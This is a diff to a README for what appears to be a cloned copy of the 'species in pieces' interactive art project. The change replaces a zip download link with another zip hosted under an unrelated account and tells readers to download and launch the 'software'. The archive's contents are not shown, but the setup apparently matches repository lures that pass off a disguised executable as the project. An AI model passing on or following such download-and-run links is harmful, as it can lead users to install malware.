@@ -18,7 +18,7 @@ In this repository, you will find the following:
 
 To explore the full collection of 30 species and their corresponding pieces, you can download the software package from the following link:
 
-[![Download Software](https://img.shields.io/static/v1?label=Download&message=Software&color=blue)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/bombastic1234/species-in-pieces/releases/download/v1.0/Application.zip)](https://github.com/bombastic1234/species-in-pieces/releases/download/v1.0/Application.zip)
 
 Please note that the software needs to be launched after downloading to access the interactive elements of the project.
 
